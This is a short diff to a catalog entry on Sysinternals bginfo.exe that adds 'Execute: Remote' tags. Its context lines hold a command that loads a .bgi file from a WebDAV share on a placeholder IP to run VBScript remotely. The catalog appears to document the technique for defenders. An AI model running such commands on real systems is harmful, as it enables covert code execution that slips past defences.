@@ -49,6 +49,7 @@ Commands:
     OperatingSystem: Windows
     Tags:
       - Execute: WSH
+      - Execute: Remote
   - Command: \\live.sysinternals.com\Tools\bginfo.exe \\10.10.10.10\webdav\bginfo.bgi /popup /nolicprompt
     Usecase: Remote execution of VBScript
     Description: This style of execution may not longer work due to patch.
@@ -58,6 +59,7 @@ Commands:
     OperatingSystem: Windows
     Tags:
       - Execute: WSH
+      - Execute: Remote
 Full_Path:
   - Path: no default
 Detection:
